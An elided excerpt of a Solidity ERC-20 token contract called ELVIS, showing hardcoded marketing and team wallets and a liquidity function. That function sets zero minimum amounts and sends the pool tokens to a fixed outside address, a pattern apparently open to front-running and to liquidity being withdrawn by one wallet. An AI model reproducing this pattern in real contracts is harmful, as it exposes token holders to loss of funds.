...
contract ELVIS is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x38aEFfC3EFC111ef88A73D0DAe496aeCeCB9562d); // Marketing Address
    address payable public teamWalletAddress = payable(0xee5a27deF4eC5601F925C94f984eB343e85afFEc); // Team Address
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            ...
            0, // slippage is unavoidable
            address(0xf39766bc6CFf37D6D2b361dfE2c0D6bbb012B8d4),
            block.timestamp
        );
    }
